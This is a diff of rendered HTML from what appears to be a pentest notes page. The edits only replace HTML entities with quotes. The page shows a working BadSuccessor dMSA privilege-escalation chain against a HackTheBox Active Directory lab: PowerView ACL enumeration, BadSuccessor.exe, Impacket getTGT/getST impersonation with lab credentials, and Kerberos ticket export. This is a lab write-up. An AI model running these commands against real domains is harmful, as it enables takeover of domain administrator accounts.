@@ -26688,7 +26688,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <span class="normal"><a href="#__codelineno-0-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a>########################################
 </span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2"></a># Check OS version (CRITICAL trigger)
 </span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3"></a>########################################
-</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4"></a>Get-ItemProperty &quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion&quot; | 
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4"></a>Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" | 
 </span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5"></a>Select-Object ProductName, CurrentVersion, CurrentBuild, ReleaseId
 </span></code></pre></div></td></tr></table></div>
 <p>Look for: Windows Server 2025 + Build 26100</p>
@@ -26751,7 +26751,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <span class="normal"><a href="#__codelineno-3-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>Import-Module .\PowerView.ps1
 </span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a>
 </span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3"></a>Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs |
-</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4"></a>? { $_.IdentityReference -match &quot;&lt;USER&gt;&quot; -and $_.ActiveDirectoryRights -match &quot;Write|CreateChild&quot; }
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4"></a>? { $_.IdentityReference -match "&lt;USER&gt;" -and $_.ActiveDirectoryRights -match "Write|CreateChild" }
 </span></code></pre></div></td></tr></table></div>
 <h2 id="attack">Attack</h2>
 <p>Exploitation Flow:</p>
@@ -26800,16 +26800,16 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <span class="normal"><a href="#__codelineno-4-41">41</a></span>
 <span class="normal"><a href="#__codelineno-4-42">42</a></span>
 <span class="normal"><a href="#__codelineno-4-43">43</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a>.\BadSuccessor.exe escalate \  
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a>-targetOU &quot;OU=STAFF,DC=domain,DC=local&quot; \  
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a>-targetOU "OU=STAFF,DC=domain,DC=local" \  
 </span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3"></a>-dmsa web_svc \  
-</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4"></a>-targetUser &quot;CN=Administrator,CN=Users,DC=domain,DC=local&quot; \  
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4"></a>-targetUser "CN=Administrator,CN=Users,DC=domain,DC=local" \  
 </span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5"></a>-dnshostname fakehost \  
 </span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6"></a>-user &lt;USER&gt; \  
 </span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7"></a>-dc-ip &lt;DC_IP&gt;
 </span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8"></a>
 </span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9"></a>
 </span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10"></a># Example:
-</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11"></a>Evil-WinRM* PS C:\Users\adam.scott\Documents&gt; .\BadSuccessor.exe escalate -targetOU &quot;OU=STAFF,DC=eighteen,DC=htb&quot; -dmsa web_svc -targetUser &quot;CN=Administrator,CN=Users,DC=eighteen,DC=htb&quot; -dnshostname FinancialPlanning -user adam.scott -dc-ip 127.0.0.1
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11"></a>Evil-WinRM* PS C:\Users\adam.scott\Documents&gt; .\BadSuccessor.exe escalate -targetOU "OU=STAFF,DC=eighteen,DC=htb" -dmsa web_svc -targetUser "CN=Administrator,CN=Users,DC=eighteen,DC=htb" -dnshostname FinancialPlanning -user adam.scott -dc-ip 127.0.0.1
 </span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12"></a>
 </span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13"></a> ______           __ _______
 </span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14"></a>|   __ \ .---.-.--|  |     __|.--.--.----.----.-----.-----.-----.-----.----.
@@ -26829,7 +26829,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-4-28"><a id="__codelineno-4-28" name="__codelineno-4-28"></a>[+] Setting userAccountControl attribute
 </span><span id="__span-4-29"><a id="__codelineno-4-29" name="__codelineno-4-29"></a>[+] Setting msDS-SupportedEncryptionTypes attribute
 </span><span id="__span-4-30"><a id="__codelineno-4-30" name="__codelineno-4-30"></a>
-</span><span id="__span-4-31"><a id="__codelineno-4-31" name="__codelineno-4-31"></a>[+] Created dMSA &#39;web_svc&#39; in &#39;OU=STAFF,DC=eighteen,DC=htb&#39;, linked to &#39;CN=Administrator,CN=Users,DC=eighteen,DC=htb&#39; (DC: 127.0.0.1)
+</span><span id="__span-4-31"><a id="__codelineno-4-31" name="__codelineno-4-31"></a>[+] Created dMSA 'web_svc' in 'OU=STAFF,DC=eighteen,DC=htb', linked to 'CN=Administrator,CN=Users,DC=eighteen,DC=htb' (DC: 127.0.0.1)
 </span><span id="__span-4-32"><a id="__codelineno-4-32" name="__codelineno-4-32"></a>
 </span><span id="__span-4-33"><a id="__codelineno-4-33" name="__codelineno-4-33"></a>[*] Phase 4: Use Rubeus or Kerbeus BOF to retrieve TGS and Password Hash
 </span><span id="__span-4-34"><a id="__codelineno-4-34" name="__codelineno-4-34"></a>    -&gt; Step 1: Find luid of krbtgt ticket
@@ -26887,24 +26887,24 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3"></a>nxc smb 240.0.0.1 -u adam.scott -p iloveyou1 --generate-krb5-file ./krb5.conf
 </span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4"></a>sudo cp krb5.conf /etc/krb5.conf 
 </span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5"></a># Grab server clock
-</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6"></a>getTGT.py -debug -dc-ip 240.0.0.1 EIGHTEEN.HTB/adam.scott:&#39;iloveyou1&#39;
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6"></a>getTGT.py -debug -dc-ip 240.0.0.1 EIGHTEEN.HTB/adam.scott:'iloveyou1'
 </span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7"></a># Use it: [+] Server time (UTC):
 </span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8"></a>sudo timedatectl set-timezone UTC
-</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9"></a>sudo date -s &quot;2026-04-17 15:37:07&quot;
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9"></a>sudo date -s "2026-04-17 15:37:07"
 </span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10"></a>
 </span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11"></a>########################################
 </span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12"></a># Get service ticket as dMSA
 </span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13"></a>########################################
 </span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14"></a>
 </span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15"></a>getST.py &lt;DOMAIN&gt;/&lt;USER&gt; \
-</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16"></a>-impersonate &#39;web_svc$&#39; \
+</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16"></a>-impersonate 'web_svc$' \
 </span><span id="__span-5-17"><a id="__codelineno-5-17" name="__codelineno-5-17"></a>-self -dmsa -k -no-pass \
 </span><span id="__span-5-18"><a id="__codelineno-5-18" name="__codelineno-5-18"></a>-dc-ip &lt;DC_IP&gt; 
 </span><span id="__span-5-19"><a id="__codelineno-5-19" name="__codelineno-5-19"></a>
 </span><span id="__span-5-20"><a id="__codelineno-5-20" name="__codelineno-5-20"></a>
 </span><span id="__span-5-21"><a id="__codelineno-5-21" name="__codelineno-5-21"></a>
 </span><span id="__span-5-22"><a id="__codelineno-5-22" name="__codelineno-5-22"></a># Example:
-</span><span id="__span-5-23"><a id="__codelineno-5-23" name="__codelineno-5-23"></a>getST.py eighteen.htb/adam.scott -impersonate &#39;web_svc$&#39; -self -dmsa -k -no-pass -dc-ip 240.0.0.1
+</span><span id="__span-5-23"><a id="__codelineno-5-23" name="__codelineno-5-23"></a>getST.py eighteen.htb/adam.scott -impersonate 'web_svc$' -self -dmsa -k -no-pass -dc-ip 240.0.0.1
 </span><span id="__span-5-24"><a id="__codelineno-5-24" name="__codelineno-5-24"></a>
 </span><span id="__span-5-25"><a id="__codelineno-5-25" name="__codelineno-5-25"></a>Impacket v0.14.0.dev0+20251209.143744.82a5a8f0 - Copyright Fortra, LLC and its affiliated companies 
 </span><span id="__span-5-26"><a id="__codelineno-5-26" name="__codelineno-5-26"></a>
@@ -26923,7 +26923,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <span class="normal"><a href="#__codelineno-6-2">2</a></span>
 <span class="normal"><a href="#__codelineno-6-3">3</a></span>
 <span class="normal"><a href="#__codelineno-6-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a># Export the ticket
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2"></a>export KRB5CCNAME=$(pwd)/&#39;web_svc$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache&#39;
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2"></a>export KRB5CCNAME=$(pwd)/'web_svc$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache'
 </span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3"></a>
 </span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4"></a>klist
 </span></code></pre></div></td></tr></table></div>
